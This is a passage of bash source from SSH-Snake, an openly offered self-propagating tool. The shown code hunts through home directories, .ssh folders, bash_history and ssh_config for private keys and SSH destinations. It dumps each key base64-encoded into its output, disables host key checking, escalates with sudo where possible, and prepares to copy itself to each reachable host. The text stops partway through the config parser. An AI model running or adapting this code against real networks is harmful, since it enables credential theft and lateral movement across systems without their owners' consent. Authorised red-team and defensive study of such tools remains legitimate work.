export THIS_SCRIPT=$(cat <<"MAIN_SCRIPT"
ignore_user=0
use_sudo=1
ssh_timeout=3
retry_count=3
ignored_users=()
ignored_hosts=()
ignored_dests=()
ignored_key_files=("*badcert.pem*" "*badkey.pem*")
custom_cmds=()
scan_paths=()
scan_paths_depth=3
use_find_from_hosts=1
use_find_arp_neighbours=1
use_find_d_block=0
use_find_from_authorized_keys=1
use_find_from_last=1
use_find_from_prev_dest=1
use_find_from_known_hosts=1
use_find_from_hashed_known_hosts=0
use_find_from_ignore_list=0
use_retry_all_dests=1
use_find_from_bash_history=1
use_find_from_ssh_config=1
interesting_users=("$USER" "root")
interesting_hosts=("127.0.0.1")
interesting_dests=()
use_combinate_interesting_users_hosts=1
use_combinate_users_hosts_aggressive=0
export LC_ALL="C"
export PATH="$PATH:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/bin"
declare -A priv_keys
declare -A key_files
declare -A home_folders
declare -A ssh_files
declare -A priv_keys_files
declare -A root_ssh_keys
declare -A root_ssh_hostnames_dests
declare -A root_ssh_hosts_dests
declare -A ssh_users
declare -A ssh_hosts
declare -A ssh_dests
declare -A _ignored_users
declare -A _ignored_hosts
declare -A _ignored_dests
declare -A _ignored_key_files
declare -A files
declare -A not_files
declare -A folders
declare -A not_folders
declare -A current_ips
declare -A ignore_list_array
_ignored_hosts["openssh.com"]=1
_ignored_hosts["255.255.255.255"]=1
ignore_separator="|"
ssh_options=(-oControlPath=none -oIdentitiesOnly=yes -oServerAliveInterval=300 -oTCPKeepAlive=no -oConnectTimeout="$ssh_timeout" -oStrictHostKeyChecking=no -oGlobalKnownHostsFile=/dev/null -oUserKnownHostsFile=/dev/null -oBatchMode=yes)
user="$USER"
script="$1"
hosts_chain="$(printf "%s" "$2" | base64 -d)"
hostnames_chain="$(printf "%s" "$5" | base64 -d)"
ignore_list="$3"
this_dest="$4"
this_host="${this_dest#*@}"
current_hostnames_ip=""
sshkeygen=("ssh-keygen" "-E" "md5" "-l" "-f")
indent=""
s=""
allowed_host_chars='[a-zA-Z0-9_.-]'
allowed_users_chars='[a-z_][a-z0-9_-]{0,31}'
print_snake() {
cat << "EOF"
                      __    __    __    __
                     /  \  /  \  /  \  /  \
____________________/  __\/  __\/  __\/  __\_______________________________,
___________________/  /__/  /__/  /__/  /__________________________________|
                   | / \   / \   / \   / \  \____                          |
                   |/   \_/   \_/   \_/   \    o \                         |
                                           \_____/--<                      |
       ---_ ......._-_--.                                                  |
      (|\ /      / /| \  \                                      ?          |
      /  /     .'  -=-'   `.                                  .            |
     /  /    .'             )                                '             |
   _/  /   .'        _.)   /                  _ -- ~~~ -- _      _______   |
  / o   o        _.-' /  .'               .-~               ~-.{__-----. : |
  \          _.-'    / .'*|             /                       \      | | |
   \______.-'//    .'.' \*|            :         O     O         :     | | |
    \|  \ | //   .'.' _ |*|            /\                       /------' j |
     `   \|//  .'.'_ _ _|*|           { {/~-.               .-~\~~~~~~~~~  |
      .  .// .'.' | _ _ \*|            \/ /  |~:- .___. -.~\  \ \          |
      \`-|\_/ /    \ _ _ \*\          / /\ \ | | { { \ \  } }  \ \         |
       `/'\__/      \ _ _ \*\        { {   \ \ |  \ \  \ \ /    } }        |
      /^|            \ _ _ \*         \ \   /\ \   \ \  /\ \   { {         |
     '  `             \ _ _ \          } } { { \ \  \ \/ / \ \  \ \        |
                       \_             / /   } }  \ \ }{ {    \ \ } }       |
 ___________________________         / /   { {     \ \{\ \    } { {        |
( Written for the mediocre. )       / /     } }     } }\\ \  / / \ \       |
(          By the mediocre. )      `-'     { {     `-'\ \`-'/ /   `-'      |
----------------------------               `-'        `-' `-'              |
                ^__^   o                                                   |
        _______\)xx(  o      <https://github.com/MegaManSec/SSH-Snake>     |
    \/\)       \)__(      By Joshua Rogers <https://joshua.hu/>            |
       | w----||  U                                                        |
       ||     ||                                  GPL 3, of course.        |
________________________~_____/^,___,-^\_________________~~_______________/`
EOF
}
print_settings() {
local setting_keys
local setting_values
local max_key_length
local max_value_length
local i
setting_keys=("ignore_user" "use_sudo" "ssh_timeout" "retry_count" "scan_paths" "scan_paths_depth" "interesting_users" "interesting_hosts" "interesting_dests" "ignored_users" "ignored_hosts" "ignored_dests" "ignored_key_files" "custom_cmds" "use_combinate_interesting_users_hosts" "use_combinate_users_hosts_aggressive" "use_find_from_hosts" "use_find_from_last" "use_find_from_authorized_keys" "use_find_from_known_hosts" "use_find_from_ssh_config" "use_find_from_bash_history" "use_find_arp_neighbours" "use_find_d_block" "use_find_from_hashed_known_hosts" "use_find_from_prev_dest" "use_find_from_ignore_list" "use_retry_all_dests")
setting_values=("$ignore_user" "$use_sudo" "$ssh_timeout" "$retry_count" "${scan_paths[*]}" "$scan_paths_depth" "${interesting_users[*]}" "${interesting_hosts[*]}" "${interesting_dests[*]}" "${ignored_users[*]}" "${ignored_hosts[*]}" "${ignored_dests[*]}" "${ignored_key_files[*]}" "${custom_cmds[*]}" "$use_combinate_interesting_users_hosts" "$use_combinate_users_hosts_aggressive" "$use_find_from_hosts" "$use_find_from_last" "$use_find_from_authorized_keys" "$use_find_from_known_hosts" "$use_find_from_ssh_config" "$use_find_from_bash_history" "$use_find_arp_neighbours" "$use_find_d_block" "$use_find_from_hashed_known_hosts" "$use_find_from_prev_dest" "$use_find_from_ignore_list" "$use_retry_all_dests")
max_key_length=0
max_value_length=0
for ((i=0; i<${#setting_keys[@]}; i++)); do
key_length="${#setting_keys[$i]}"
value_length="${#setting_values[$i]}"
((key_length > max_key_length)) && max_key_length=$key_length
((value_length > max_value_length)) && max_value_length=$value_length
done
printf "|%-*s|%-*s|\n" "$((max_key_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_key_length + 4))"))" "$((max_value_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_value_length + 4))"))"
printf "| %-*s | %-*s |\n" "$((max_key_length + 2))" "Setting" "$((max_value_length + 2))" "Value"
printf "|%-*s|%-*s|\n" "$((max_key_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_key_length + 4))"))" "$((max_value_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_value_length + 4))"))"
for ((i=0; i<${#setting_keys[@]}; i++)); do
printf "| %-*s | %-*s |\n" "$((max_key_length + 2))" "${setting_keys[$i]}" "$((max_value_length + 2))" "${setting_values[$i]}"
done
printf "|%-*s|%-*s|\n\n\n" "$((max_key_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_key_length + 4))"))" "$((max_value_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_value_length + 4))"))"
}
remove_functions() {
local this_script
local function_names
this_script="$1"
function_names="$2"
printf "%s" "$this_script" | awk -v fnames="$function_names" '
function is_func_line() {
for (i in funcs) {
if ($0 ~ "^" funcs[i] "\\(\\)") {
return 1
 }
 }
return 0
 }
function is_func_call() {
for (i in funcs) {
if ($0 ~ "^[ ]*" funcs[i]) {
return 1
 }
 }
return 0
 }
BEGIN {
split(fnames, funcs, " ");
in_func = 0
 }
is_func_line() { in_func = 1; next }
/^\}/ { if (in_func) { in_func = 0; next } }
is_func_call() { next }
!in_func { print }
'
}
gen_retried_interesting_dests() {
local ssh_dest
for ssh_dest in "${!root_ssh_hostnames_dests[@]}"; do
printf "%s" "$ssh_dest" | awk -F'[@():]' -v OFS='@' '
{
user = $1
for (i = 2; i <= NF; i++) {
if ($i != "" && user != "") {
print "\\x22" user "@" $i "\\x22"
 }
 }
 }'
done
for ssh_dest in "${!root_ssh_hosts_dests[@]}"; do
printf "\\\x22%s\\\x22\n" "$ssh_dest"
done
}
shape_script() {
local line
local local_script
local opt_function_list
local opt_function
local ssh_dest
opt_function_list=("use_combinate_interesting_users_hosts" "use_combinate_users_hosts_aggressive" "use_find_from_hosts" "use_find_from_last" "use_find_from_authorized_keys" "use_find_from_known_hosts" "use_find_from_ssh_config" "use_find_from_bash_history" "use_find_arp_neighbours" "use_find_d_block" "use_find_from_hashed_known_hosts" "use_find_from_prev_dest" "use_find_from_ignore_list" "use_retry_all_dests")
for opt_function in "${opt_function_list[@]}"; do
if [[ ${!opt_function} -eq 0 ]]; then
remove_function+="${opt_function#use_} "
fi
[[ "$opt_function" =~ use_find_from_ignore_list|use_retry_all_dests ]] && continue
remove_function+="$opt_function "
done
if [[ ${#custom_cmds[@]} -eq 0 ]]; then
remove_function+="exec_custom_cmds "
remove_function+="custom_cmds "
fi
if [[ ${#scan_paths[@]} -eq 0 || $scan_paths_depth -lt 1 ]]; then
remove_function+="find_ssh_keys_paths "
remove_function+="scan_paths "
remove_function+="scan_paths_depth "
fi
if [[ ${#ignored_users[@]} -eq 0 && ${#ignored_hosts[@]} -eq 0 && ${#ignored_dests[@]} -eq 0 ]]; then
remove_function+="init_ignored "
remove_function+="ignored_users ignored_hosts ignored_dests "
fi
if [[ $use_combinate_users_hosts_aggressive -eq 0 ]] && [[ ${#interesting_users[@]} -eq 0 || $use_combinate_interesting_users_hosts -eq 0 ]]; then
remove_function+="find_from_hosts find_arp_neighbours find_d_block "
fi
if [[ $use_find_from_authorized_keys -eq 0 && $use_find_from_known_hosts -eq 0 && $use_find_from_hashed_known_hosts -eq 0 ]]; then
remove_function+="find_user_from_file "
fi
if [[ $use_combinate_users_hosts_aggressive -eq 1 ]]; then
remove_function+="use_combinate_interesting_users_hosts combinate_interesting_users_hosts "
fi
if [[ $use_combinate_interesting_users_hosts -eq 0 && $use_combinate_users_hosts_aggressive -eq 0 ]]; then
remove_function+="interesting_hosts interesting_users "
if [[ $use_retry_all_dests -eq 0 ]]; then
remove_function+="interesting_dests "
fi
fi
if [[ ${#interesting_users[@]} -eq 0 && ${#interesting_hosts[@]} -eq 0 && ${#interesting_dests[@]} -eq 0 ]]; then
if [[ $use_retry_all_dests -eq 0 ]]; then
remove_function+="interesting_dests "
fi
remove_function+="combinate_interesting_users_hosts use_combinate_interesting_users_hosts "
remove_function+="interesting_users interesting_hosts "
fi
if [[ $use_find_from_ignore_list -eq 0 ]]; then
remove_function+="use_find_from_ignore_list "
fi
if [[ $use_retry_all_dests -eq 0 ]]; then
remove_function+="use_retry_all_dests "
fi
if [[ $use_sudo -eq 0 ]]; then
remove_function+="check_sudo use_sudo s= "
fi
if [[ ${#ignored_key_files[@]} -eq 0 ]]; then
remove_function+="ignored_key_files "
fi
remove_function+="shape_script "
remove_function+="fin_root "
remove_function+="print_settings "
remove_function+="remove_functions "
remove_function+="print_snake "
remove_function+="gen_retried_interesting_dests "
remove_function+="root_ssh_keys root_ssh_hostnames_dests root_ssh_hosts_dests"
local_script="$(remove_functions "$THIS_SCRIPT" "$remove_function")"
local_script="$(printf "%s" "$local_script" | sed -e 's/^[ ]*//' -e 's/^#.*$//' -e 's/[ ]#.*//' -e '/^[ ]*$/d')"
while IFS= read -r line; do
if [[ "$line" == *"EXTERNAL_MSG: KEY"* ]]; then
root_ssh_keys["${line##* }"]=1
elif [[ "$line" =~ ($allowed_users_chars@\([0-9\.:]*\))$ ]]; then
root_ssh_hostnames_dests["${BASH_REMATCH[1]}"]=1
elif [[ "$line" =~ ($allowed_users_chars@[0-9\.]*)$ ]]; then
root_ssh_hosts_dests["${BASH_REMATCH[1]}"]=1
fi
printf "[%s]" "$(date +%s)"
printf "%s\n" "$line"
done < <(echo 'printf "%s" "$1" | base64 -d | bash --noprofile --norc -s $1' | bash --noprofile --norc -s "$(printf "%s" "$local_script" | base64 | tr -d '\n')" 2>&1 | grep -v -F 'INTERNAL_MSG')
[[ $use_retry_all_dests -eq 1 ]] || return
local retried_interesting_dests
retried_interesting_dests="$(gen_retried_interesting_dests | sort | uniq)"
[[ "${#retried_interesting_dests}" -gt 0 ]] || return
printf "\n\n---------------------------------------\n\n"
printf "use_retry_all_dests=1. Re-starting.\n"
printf "%s destinations (from %s unique servers) added to interesting_dests.\n" "$(echo "$retried_interesting_dests" | wc -l)" "${#root_ssh_hostnames_dests[@]}"
retried_interesting_dests="$(echo "$retried_interesting_dests" | tr '\n' ' ')"
printf "\n---------------------------------------\n\n\n"
local_script="$(printf "%s" "$local_script" | sed 's/^interesting_dests=(/interesting_dests=('"$retried_interesting_dests"'/')"
local_script="$(printf "%s" "$local_script" | sed 's/^use_retry_all_dests=1/use_retry_all_dests=2/')"
remove_function="find_from_authorized_keys find_from_hosts find_from_last find_arp_neighbours find_d_block find_from_ignore_list find_from_known_hosts find_from_hashed_known_hosts find_from_prev_dest combinate_users_hosts_aggressive combinate_interesting_users_hosts interesting_users interesting_hosts deduplicate_resolved_hosts_keys init_ignored ignored_users ignored_hosts ignored_dests find_user_from_file "
local_script="$(remove_functions "$local_script" "$remove_function")"
while IFS= read -r line; do
if [[ "$line" == *"EXTERNAL_MSG: KEY"* ]]; then
root_ssh_keys["${line##* }"]=1
elif [[ "$line" =~ ($allowed_users_chars@\([0-9\.:]*\))$ ]]; then
root_ssh_hostnames_dests["${BASH_REMATCH[1]}"]=1
elif [[ "$line" =~ ($allowed_users_chars@[0-9\.]*)$ ]]; then
root_ssh_hosts_dests["${BASH_REMATCH[1]}"]=1
fi
printf "[%s]" "$(date +%s)"
printf "%s\n" "$line"
done < <(echo 'printf "%s" "$1" | base64 -d | bash --noprofile --norc -s $1' | bash --noprofile --norc -s "$(printf "%s" "$local_script" | base64 | tr -d '\n')" 2>&1 | grep -v -F 'INTERNAL_MSG')
}
fin_root() {
local root_ssh_dest
declare -A root_ssh_hosts
for root_ssh_dest in "${!root_ssh_hostnames_dests[@]}"; do
root_ssh_hosts["${root_ssh_dest#*@}"]=1
done
printf "\n\n\n"
cat <<"EOF"
               ______
          _.-""      ""-._
       .-'                `-.
     .'      __.----.__      `.
    /     .-"          "-.     \
   /    .'                `.    \
  J    /                    \    L
  F   J                      L   J
 J    F                      J    L
 |   J                        L   |
 |   |                        |   |
 |   J                        F   |
 J    L                      J    F
  L   J   .-""""-.           F   J
  J    \ /        \   __    /    F
   \    (|)(|)_   .-'".'  .'    /
    \    \   /_>-'  .<_.-'     /
     `.   `-'     .'         .'
       `--.|___.-'`._    _.-'
           ^         """"

           ..             ..
          ( '`<          ( '`<  ...Summary Report:
           )(             )(
    ( ----'  '.    ( ----'  '.
    (         ;    (         ;
     (_______,'     (_______,'
~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^
EOF
printf "Unique private keys discovered: %s\n" "${#root_ssh_keys[@]}"
printf "Unique shell accounts accessed: %s\n" "${#root_ssh_hostnames_dests[@]}"
printf "Unique systems accessed: %s\n" "${#root_ssh_hosts[@]}"
printf "\nNeed a list of servers accessed? Run one of these commands:\n\n"
cat <<"EOF"
grep -oE "[a-z_][a-z0-9_-]{0,31}@[0-9\.]*$" output.log  | sort | uniq
grep -oE "[a-z_][a-z0-9_-]{0,31}@\([0-9\.:]*\)$" output.log  | sort | uniq
EOF
printf -- "-- https://joshua.hu/ --\n"
printf -- "-- https://github.com/MegaManSec/SSH-Snake --\n"
printf "\nThanks for playing!\n"
}
check_commands() {
local required_commands
local required_command
required_commands=("ssh-keygen" "readlink" "ssh" "basename" "base64" "awk" "sort" "uniq" "grep" "tr" "find" "cat")
for required_command in "${required_commands[@]}"; do
if ! command -v "$required_command" >/dev/null 2>&1; then
echo "$required_command"
return
fi
done
if [[ "${BASH_VERSINFO:-0}" -lt 4 ]]; then
echo "bash"
return
fi
}
check_startup() {
local missing_command
missing_command="$(check_commands)"
if [[ -z "$script" ]]; then
if ! command -v sed >/dev/null 2>&1; then
printf "Could not begin because 'sed' is not available!\n"
exit 1
elif [[ -n "$missing_command" ]]; then
printf "Could not begin because %s is not available!\n" "$missing_command"
exit 1
fi
print_snake
print_settings
shape_script
fin_root
exit 0
fi
if [[ -n "$missing_command" ]]; then
printf "INTERNAL_MSG: command not found: %s\n" "$required_command"
exit 1
fi
if ! printf "%s" "$script" | base64 -d >/dev/null 2>&1; then
printf "Usage: bash %s >output.log\n" "$0"
exit 1
fi
}
fin() {
printf "INTERNAL_MSG: ignore list: %s%s@%s%s\n" "$ignore_separator" "$user" "$current_hostnames_ip" "$ignore_separator"
exit 0
}
check_sudo() {
[[ $use_sudo -eq 1 ]] && sudo -n true >/dev/null 2>&1 && s="sudo"
}
check_sshkeygen() {
[[ "$(ssh-keygen -E 2>&1)" == *"unknown option"* ]] && sshkeygen=("ssh-keygen" "-l" "-f")
}
check_ssh_options() {
local ssh_extra_options
local ssh_extra_option
ssh_extra_options=(-oHostkeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1)
for ssh_extra_option in "${ssh_extra_options[@]}"; do
[[ "$(ssh "$ssh_extra_option" 2>&1)" =~ Bad\ protocol\ 2\ host\ key\ algorithms|Bad\ SSH2\ KexAlgorithms|Bad\ key\ types|diffie-hellman-group1-sha1|ssh-rsa ]] || ssh_options+=("$ssh_extra_option")
done
ssh_extra_option="-oPubkeyAcceptedKeyTypes=+ssh-rsa"
[[ "$(ssh "$ssh_extra_option" 2>&1)" =~ Bad\ configuration\ option|pubkeyacceptedkeytypes ]] || ssh_options+=("$ssh_extra_option")
}
init_current_ips() {
local current_ip
local default_route
local default_ip
local iface
while IFS= read -r current_ip; do
current_ips["$current_ip"]=1
done < <(${s} hostname -I 2>/dev/null | tr ' ' '\n' | grep -F '.')
while IFS= read -r iface; do
while IFS= read -r current_ip; do
current_ips["$current_ip"]=1
done < <(${s} ipconfig getifaddr "$iface" 2>/dev/null)
done < <(${s} ifconfig -l 2>/dev/null | tr ' ' '\n')
current_hostnames_ip="$(IFS=:; echo "${!current_ips[*]}")"
if ip route show default >/dev/null 2>&1; then
default_route="$(${s} ip route show default 2>/dev/null | awk '/default via/{print $3; exit}')"
default_route="${default_route:-"1.1.1.1"}"
default_ip="$(${s} ip route get "$default_route" 2>/dev/null | awk -F'src' '{print $NF; exit}' | awk '{print $1}')"
elif route -n get 1.1.1.1 >/dev/null 2>&1; then
iface="$(${s} route -n get 1.1.1.1 2>/dev/null | awk '/interface: / {print $2;exit}')"
default_ip="$(${s} ipconfig getifaddr "$iface" 2>/dev/null)"
fi
default_ip="${default_ip:-"???"}"
this_host="${this_host:-"$default_ip"}"
[[ ${#current_ips[@]} -eq 0 ]] && current_ips["$this_host"]=1 && current_hostnames_ip="$this_host"
}
init_chains() {
hosts_chain="$hosts_chain${hosts_chain:+->}$user@$this_host"
hostnames_chain="$hostnames_chain${hostnames_chain:+->}$user@($current_hostnames_ip)"
}
init_indent() {
local recursive_indent_length
local temp_chain
local pattern
pattern=']->'
temp_chain="$hosts_chain"
recursive_indent_length=0
while [[ "$temp_chain" == *"$pattern"* ]]; do
((recursive_indent_length++))
temp_chain="${temp_chain#*"$pattern"}"
done
indent="$(printf "%*s" $recursive_indent_length "")"
}
chained_print() {
printf "%s%s%s\n" "$indent" "$hosts_chain" "$1"
}
init_ignored() {
local ignored_user
local ignored_host
local ignored_dest
local current_ip
for ignored_user in "${ignored_users[@]}"; do
is_ssh_user "$ignored_user" && _ignored_users["$ignored_user"]=1
[[ "$ignored_user" == "$user" ]] && fin
done
for ignored_host in "${ignored_hosts[@]}"; do
is_ssh_host "$ignored_host" && _ignored_hosts["$ignored_host"]=1
[[ -v 'current_ips["$ignored_host"]' || ${#current_ips["$ignored_host"]} -gt 0 ]] && fin
done
for ignored_dest in "${ignored_dests[@]}"; do
is_ssh_dest "$ignored_dest" && _ignored_dests["$ignored_dest"]=1
for current_ip in "${!current_ips[@]}"; do
[[ "$ignored_dest" == "$user@$current_ip" ]] && fin
done
done
}
load_ignore_list_array() {
local line
while IFS= read -r line; do
ignore_list_array["$line"]=1
done < <(echo "$ignore_list" | tr '|' '\n'  | awk -F'[@:]' -v OFS='@' '
{
user = $1
for (i = 2; i <= NF; i++) {
if ($i != "" && user != "") {
print user "@" $i
}
}
}'
)
}
check_for_recursion() {
[[ $ignore_user -eq 1 ]] && [[ "$ignore_list" == *"@$current_hostnames_ip$ignore_separator"* ]] && fin
[[ "$ignore_list" == *"$ignore_separator$user@$current_hostnames_ip$ignore_separator"* ]] && fin
ignore_list+="$ignore_separator$user@$current_hostnames_ip$ignore_separator"
load_ignore_list_array
}
setup() {
check_startup
check_sudo
check_sshkeygen
check_ssh_options
init_current_ips
init_chains
init_indent
chained_print ""
printf "%s%s\n" "$indent" "$hostnames_chain"
init_ignored
check_for_recursion
}
retry_all_dests() {
local current_ip
local ssh_dest
[[ $use_retry_all_dests -eq 2 ]] || return
for current_ip in "${!current_ips[@]}"; do
if [[ " ${interesting_dests[*]} " != *" $user@$current_ip "* ]]; then
return
fi
done
add_ssh_dest() { :; }
add_ssh_host() { :; }
add_ssh_user() { :; }
for ssh_dest in "${interesting_dests[@]}"; do
is_ssh_dest "$ssh_dest" && ssh_dests["$ssh_dest"]=1
done
}
exec_custom_cmds() {
local cmd
for cmd in "${custom_cmds[@]}"; do
local output
output="$(eval "$cmd" 2>&1| base64 | tr -d '\n')"
chained_print ": EXTERNAL_MSG: CMD[$cmd]: $output"
done
}
find_home_folders() {
local home_folder
while IFS= read -r home_folder; do
[[ -v 'home_folders["$home_folder"]' || ${#home_folders["$home_folder"]} -gt 0 ]] && continue
home_folder="$(readlink -f -- "$home_folder" 2>/dev/null)"
is_dir "$home_folder" && home_folders["$home_folder"]=1
done < <(${s} find -L "/home" "/Users" -mindepth 1 -maxdepth 1 -type d 2>/dev/null)
while IFS=: read -r _ _ _ _ _ home_folder _; do
[[ -v 'home_folders["$home_folder"]' || ${#home_folders["$home_folder"]} -gt 0 ]] && continue
home_folder="$(readlink -f -- "$home_folder" 2>/dev/null)"
is_dir "$home_folder" && home_folders["$home_folder"]=1
done < <(getent passwd 2>/dev/null)
}
init_ssh_files() {
local home_folder
for home_folder in "${!home_folders[@]}"; do
local ssh_folder
local ssh_file
ssh_folder="$home_folder/.ssh"
is_dir "$ssh_folder" || continue
while IFS= read -r ssh_file; do
is_file "$ssh_file" || continue
ssh_files["$ssh_file"]=1
done < <(${s} find -L "$ssh_folder" -type f 2>/dev/null)
done
}
check_file_for_privkey() {
local known_key_headers
local key_file
local key_header
local file_header
key_file="$1"
known_key_headers=(
"SSH PRIVATE KEY FILE FORMAT 1.1"
"-----BEGIN RSA PRIVATE KEY-----"
"-----BEGIN DSA PRIVATE KEY-----"
"-----BEGIN EC PRIVATE KEY-----"
"-----BEGIN OPENSSH PRIVATE KEY-----"
"-----BEGIN PRIVATE KEY-----"
"-----BEGIN ENCRYPTED PRIVATE KEY-----"
"---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----"
)
is_file "$key_file" || return 1
read -r -n 50 file_header < <(${s} cat -- "$key_file" 2>/dev/null)
for key_header in "${known_key_headers[@]}"; do
if [[ "$file_header" == *"$key_header"* ]]; then
return 0
fi
done
return 1
}
populate_keys() {
local ssh_pubkey
local ssh_pubkey_ret
local key_file
key_file="$1"
ssh_pubkey="$(${s} ssh-keygen -P NOT_VALID4SURE -yf "$key_file" 2>&1)"
ssh_pubkey_ret=$?
if [[ "$ssh_pubkey" == *"invalid format"* || "$ssh_pubkey" == *"No such file or directory"* ]]; then
return 1
fi
if [[ $ssh_pubkey_ret -eq 0 ]]; then
chained_print ": Discovered usable private key in [$key_file]"
priv_keys["$ssh_pubkey"]="$key_file"
else
chained_print ": Discovered unusable private key in [$key_file]"
fi
chained_print ": EXTERNAL_MSG: KEY[$key_file]: $(${s} cat -- "$key_file" 2>/dev/null | base64 | tr -d '\n')"
return 0
}
check_and_populate_keys() {
local unresolved_key_file
local key_file
local ignored_key_file
unresolved_key_file="$1"
[[ -z "$unresolved_key_file" ]] && return 1
[[ -v 'priv_keys_files["$unresolved_key_file"]' || ${#priv_keys_files["$unresolved_key_file"]} -gt 0 ]] && return 0
[[ -v 'key_files["$unresolved_key_file"]' || ${#key_files["$unresolved_key_file"]} -gt 0 ]] && return 1
key_file="$(${s} readlink -f -- "$unresolved_key_file" 2>/dev/null)"
[[ -z "$key_file" ]] && key_files["$unresolved_key_file"]=1 && return 1
[[ -v 'priv_keys_files["$key_file"]' || ${#priv_keys_files["$key_file"]} -gt 0 ]] && priv_keys_files["$unresolved_key_file"]=1 && return 0
[[ -v 'key_files["$key_file"]' || ${#key_files["$key_file"]} -gt 0 ]] && key_files["$unresolved_key_file"]=1 && return 1
key_files["$unresolved_key_file"]=1
key_files["$key_file"]=1
for ignored_key_file in "${ignored_key_files[@]}"; do
[[ "$key_file" == $ignored_key_file ]] && return 1
done
if check_file_for_privkey "$key_file"; then
populate_keys "$key_file" && priv_keys_files["$key_file"]=1 && priv_keys_files["$unresolved_key_file"]=1 && return 0
fi
return 1
}
find_ssh_keys() {
local ssh_file
for ssh_file in "${!ssh_files[@]}"; do
check_and_populate_keys "$ssh_file"
done
}
find_ssh_keys_paths() {
local ssh_file
while IFS= read -r ssh_file; do
check_and_populate_keys "$ssh_file"
done < <(${s} find -L ${scan_paths[@]} -maxdepth "$scan_paths_depth" -type f -size +200c -size -14000c -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + 2>/dev/null)
}
check_potential_key_files() {
local key_file
local home_folder
local potential_key_file
key_file="$1"
home_folder="$2"
for potential_key_file in "$key_file" "$home_folder/${key_file:1}" "$home_folder/$key_file"; do
check_and_populate_keys "$potential_key_file" && return 0
done
return 1
}
find_from_bash_history() {
local home_folder
for home_folder in "${!home_folders[@]}"; do
local home_file
local bash_history_line
local home_user
home_file="$home_folder/.bash_history"
is_file "$home_file" || continue
home_user="$(basename -- "$home_folder" 2>/dev/null)"
while IFS= read -r bash_history_line; do
local ssh_dest
local tokens
local i
local cached_ssh_user
local cached_ssh_host
local cached_ssh_key
cached_ssh_user=""
cached_ssh_host=""
cached_ssh_key=""
if ssh_dest="$(echo "$bash_history_line" | grep -m 1 -oE "$allowed_users_chars"'@[^ :]+')"; then
local ssh_host
local ssh_user
ssh_host="${ssh_dest#*@}"
ssh_user="${ssh_dest%%@*}"
add_ssh_dest "$ssh_dest" && cached_ssh_user="$ssh_user" && cached_ssh_host="$ssh_host"
elif [[ "$bash_history_line" == "scp "* ]]; then
local ssh_host
ssh_host="$(echo "$bash_history_line" | grep -m 1 -o -E '[^ ]+:')"
ssh_host="${ssh_host%:}"
add_ssh_dest "$home_user@$ssh_host" && cached_ssh_user="$home_user" && cached_ssh_host="$ssh_host"
fi
[[ "$bash_history_line" == "rsync "* ]] && continue
read -ra tokens < <(printf "%s" "$bash_history_line")
for ((i=0; i<${#tokens[@]}; i++)); do
local token
[[ -n "$cached_ssh_user" && -n "$cached_ssh_host" ]] && [[ "$bash_history_line" != *" -i"* || -n "$cached_ssh_key" ]] && break
[[ -n "$cached_ssh_host" && -z "$cached_ssh_user" && "$bash_history_line" != *" -l"* ]] && [[ "$bash_history_line" != *" -i"* || -n "$cached_ssh_key" ]] && break
token="${tokens[$i]}"
[[ "$token" == "ssh" ]] && continue
[[ "$token" == "scp" ]] && continue
if [[ "$token" == "-i"* ]]; then
local key_file
if [[ ${#token} -gt 2 ]]; then
key_file="${token:2}"
elif [[ $((i+1)) -lt ${#tokens[@]} ]]; then
key_file="${tokens[$i+1]}"
else
continue
fi
check_potential_key_files "$key_file" "$home_folder" && cached_ssh_key="$key_file"
elif [[ "$token" == "-l"* ]]; then
local ssh_user
if [[ ${#token} -gt 2 ]]; then
ssh_user="${token:2}"
elif [[ $((i+1)) -lt ${#tokens[@]} ]]; then
ssh_host="${tokens[$i+1]}"
else
continue
fi
[[ -z "$cached_ssh_user" ]] && add_ssh_user "$ssh_user" && cached_ssh_user="$ssh_user"
else
[[ "$token" == "-"* ]] && continue
[[ $i -gt 0 ]] || continue
local prev_token
local prev_prev_token
prev_token="${tokens[$i-1]}"
[[ $i -gt 1 ]] && prev_prev_token="${tokens[$i-2]}"
[[ "$bash_history_line" == "ssh "* ]] || continue
if [[ "$prev_token" == "-"* ]]; then
if [[ "$prev_token" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]*$ || ${#prev_token} -gt 2 ]]; then
local ssh_host
ssh_host="$token"
[[ -z "$cached_ssh_host" ]] && add_ssh_host "$ssh_host" && cached_ssh_host="$ssh_host"
fi
elif [[ "$prev_token" == "ssh" ]]; then
local ssh_host
local ssh_user
ssh_host="$token"
[[ -z "$cached_ssh_host" ]] && add_ssh_host "$ssh_host" && cached_ssh_host="$ssh_host"
elif [[ $i -gt 1 && "$prev_prev_token" == "-"* ]] && [[ ! "$prev_prev_token" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]*$ && ! ${#prev_prev_token} -gt 2 ]]; then
local ssh_host
ssh_host="$token"
[[ -z "$cached_ssh_host" ]] && add_ssh_host "$ssh_host" && cached_ssh_host="$ssh_host"
elif [[ $i -gt 1 && "${prev_prev_token:0:1}" != "-" && "${prev_token:0:1}" != "-" ]]; then
break
else
break
fi
fi
done
[[ -z "$cached_ssh_user" ]] && add_ssh_user "$home_user" && cached_ssh_user="$home_user"
[[ -n "$cached_ssh_user" && -n "$cached_ssh_host" ]] && add_ssh_dest "$cached_ssh_user@$cached_ssh_host"
done < <(${s} grep -E '^(ssh|scp|rsync) ' -- "$home_file" 2>/dev/null | sort | uniq)
done
}
find_from_ssh_config() {
local home_folder
for home_folder in "${!home_folders[@]}"; do
local ssh_file
local home_user
is_dir "$home_folder/.ssh" || continue
home_user="$(basename -- "$home_folder" 2>/dev/null)"
while IFS= read -r ssh_file; do
is_file "$ssh_file" || continue
local cline
while IFS= read -r cline; do
local cline_val
local cline_key
cline_val="$(echo "$cline" | awk '{print $NF}')"
cline_key="$(echo "$cline" | awk '{print $1}')"
cline_key="${cline_key,,}"
[[ -z "$cline_val" ]] && continue
[[ -z "$cline_key" ]] && continue
case "$cline_key" in
"host")
add_ssh_host "$cline_val"
